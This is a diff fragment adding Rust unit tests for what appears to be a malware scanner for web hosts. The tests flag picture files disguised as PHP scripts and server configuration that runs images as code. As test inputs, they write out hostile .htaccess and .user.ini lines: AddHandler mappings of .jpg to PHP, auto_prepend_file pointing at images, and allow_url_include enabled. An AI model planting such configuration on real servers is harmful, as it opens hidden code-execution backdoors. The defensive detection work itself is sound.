+        tail.extend(noise(2000, 9));
+        let s = img(
+            "IMG_1.jpg",
+            &picture(JPEG_HEAD, b"", &[JPEG_END, &tail].concat()),
+        );
+        assert_eq!(s.verdict, Verdict::Clean, "hits={:?}", s.hits);
+        let s = img(
+            "IMG_2.jpg",
+            &picture(JPEG_HEAD, b"", &[JPEG_END, b"\n"].concat()),
+        );
+        assert_eq!(s.verdict, Verdict::Clean);
+    }
+
+    #[test]
+    fn a_script_name_part_before_the_picture_extension() {
+        assert!(double_extension("shell.php.jpg"));
+        assert!(double_extension("a.phtml.png"));
+        assert!(!double_extension("my.photo.jpg"));
+        assert!(!double_extension("photo.jpg"));
+        let real = picture(JPEG_HEAD, b"", JPEG_END);
+        assert_eq!(img("shell.php.jpg", &real).verdict, Verdict::Clean);
+        assert!(has_rule(&img("shell.php.jpg", &real), "double-extension"));
+        let fake = b"just some text standing in for a picture, long enough to read";
+        assert_eq!(img("shell.php.jpg", fake).verdict, Verdict::Suspicious);
+    }
+
+    #[test]
+    fn empty_and_tiny_pictures_are_clean() {
+        assert_eq!(img("a.gif", b"").verdict, Verdict::Clean);
+        assert_eq!(
+            img("a.gif", b"GIF89a\x01\x00\x01\x00").verdict,
+            Verdict::Clean
+        );
+    }
+
+    #[test]
+    fn the_php_marker_for_files_opened_by_recency() {
+        assert!(has_php_marker(b"<?PHP echo 1;"));
+        assert!(has_php_marker(b"<?php\necho 1;"));
+        assert!(has_php_marker(b"<? echo 1; ?>"));
+        assert!(has_php_marker(b"<?= $x ?>"));
+        assert!(!has_php_marker(b"<?xml version=\"1.0\"?><a/>"));
+        assert!(!has_php_marker(b"just some text"));
+        assert!(!has_php_marker(b"<? \x00\x01\x02\x03\x04\x05\x06\x07"));
+    }
+
+    // ---- configuration that makes pictures run as code ------------------
+
+    fn cfg(name: &str, text: &str) -> Score {
+        score_config(name, text.as_bytes())
+    }
+
+    #[test]
+    fn mapping_pictures_to_php_is_malicious() {
+        let s = cfg(".htaccess", "AddHandler application/x-httpd-php .jpg\n");
+        assert_eq!(s.verdict, Verdict::Malicious);
+        assert!(has_rule(&s, "config-image-as-code"));
+        assert!(s.context.contains("addhandler"), "{}", s.context);
+        assert_eq!(
+            cfg(
+                ".htaccess",
+                "AddType application/x-httpd-php .php .png .gif"
+            )
+            .verdict,
+            Verdict::Malicious
+        );
+        let block = "<FilesMatch \"\\.(jpg|png|gif)$\">\n  SetHandler application/x-httpd-php\n</FilesMatch>\n";
+        assert_eq!(cfg(".htaccess", block).verdict, Verdict::Malicious);
+        let cgi = "<Files shell.jpg>\n  ForceType application/x-httpd-php\n</Files>\n";
+        assert_eq!(cfg(".htaccess", cgi).verdict, Verdict::Malicious);
+        // A commented line does nothing.
+        assert_eq!(
+            cfg(".htaccess", "# AddHandler application/x-httpd-php .jpg\n").verdict,
+            Verdict::Clean
+        );
+    }
+
+    #[test]
+    fn ordinary_htaccess_files_are_clean() {
+        let wp = "# BEGIN WordPress\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /index.php [L]\n</IfModule>\n# END WordPress\n";
+        assert_eq!(cfg(".htaccess", wp).verdict, Verdict::Clean);
+        let fpm = "<FilesMatch \\.php$>\n  SetHandler \"proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost\"\n</FilesMatch>\n";
+        assert_eq!(cfg(".htaccess", fpm).verdict, Verdict::Clean);
+        let cpanel = "AddHandler application/x-httpd-ea-php74___lsphp .php .php7 .phtml\n";
+        assert_eq!(cfg(".htaccess", cpanel).verdict, Verdict::Clean);
+        let html = "AddHandler application/x-httpd-php .html .htm\n";
+        assert_eq!(cfg(".htaccess", html).verdict, Verdict::Clean);
+        let types = "AddType image/webp .webp\nAddType application/javascript .js\n";
+        assert_eq!(cfg(".htaccess", types).verdict, Verdict::Clean);
+        let deny = "<FilesMatch \"\\.(jpg|png)$\">\n  Header set Cache-Control \"max-age=86400\"\n</FilesMatch>\n";
+        assert_eq!(cfg(".htaccess", deny).verdict, Verdict::Clean);
+    }
+
+    #[test]
+    fn mapping_plain_data_to_php_is_reported() {
+        let s = cfg(".htaccess", "AddHandler application/x-httpd-php .txt\n");
+        assert!(has_rule(&s, "config-data-as-code"));
+    }
+
+    #[test]
+    fn a_prepended_picture_is_malicious() {
+        let s = cfg(
+            ".user.ini",
+            "auto_prepend_file = /home/u/public_html/a/logo.jpg\n",
+        );
+        assert_eq!(s.verdict, Verdict::Malicious);
+        assert!(has_rule(&s, "config-auto-include-nonphp"));
+        assert_eq!(
+            cfg(
+                ".htaccess",
+                "php_value auto_prepend_file \"/home/u/x.png\"\n"
+            )
+            .verdict,
+            Verdict::Malicious
+        );
+        assert_eq!(
+            cfg(
+                "php.ini",
+                "auto_append_file = '/var/www/s/data.txt' ; note\n"
+            )
+            .verdict,
+            Verdict::Malicious
+        );
+    }
+
+    #[test]
+    fn a_prepended_php_file_is_judged_by_where_it_sits() {
+        // A security plugin does this.
+        let waf = "auto_prepend_file = '/home/u/public_html/wordfence-waf.php'\n";
+        assert_eq!(cfg(".user.ini", waf).verdict, Verdict::Clean);
+        assert_eq!(
+            cfg(".user.ini", "auto_prepend_file = none\n").verdict,
+            Verdict::Clean
+        );
+        assert_eq!(
+            cfg(".user.ini", "auto_prepend_file =\n").verdict,
+            Verdict::Clean
+        );
+        let hidden = "auto_prepend_file = /home/u/public_html/wp-content/uploads/x.php\n";
+        assert_eq!(cfg(".user.ini", hidden).verdict, Verdict::Suspicious);
+        let dot = "auto_prepend_file = /home/u/public_html/.cache/x.php\n";
+        assert_eq!(cfg(".user.ini", dot).verdict, Verdict::Suspicious);
+    }
+
+    #[test]
+    fn remote_include_switched_on_is_reported() {
+        let s = cfg("php.ini", "allow_url_include = On\n");
+        assert!(has_rule(&s, "config-allow-url-include"));
+        assert_eq!(cfg("php.ini", "allow_url_include = Off\n").score, 0);
     }
 }
